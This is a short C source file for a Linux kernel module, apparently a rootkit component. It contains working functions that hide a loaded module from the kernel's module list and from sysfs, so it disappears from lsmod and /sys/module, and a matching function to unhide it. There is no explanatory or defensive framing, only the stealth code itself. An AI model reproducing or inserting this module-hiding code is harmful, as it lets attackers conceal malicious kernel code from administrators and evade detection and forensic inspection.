#include <linux/module.h>
#include <linux/sysfs.h>
#include <linux/list.h>
#include "module_hiding.h"

struct list_head *mod_prev;

void hide_module(struct module *mod)
{
	mod_prev = mod->list.prev;
	list_del(&mod->list);
	kobject_del(&mod->mkobj.kobj);
}

void unhide_module(struct module *mod)
{
	unsigned long ret;
	list_add(&mod->list, mod_prev);
	ret = kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "%s", mod->name);
}
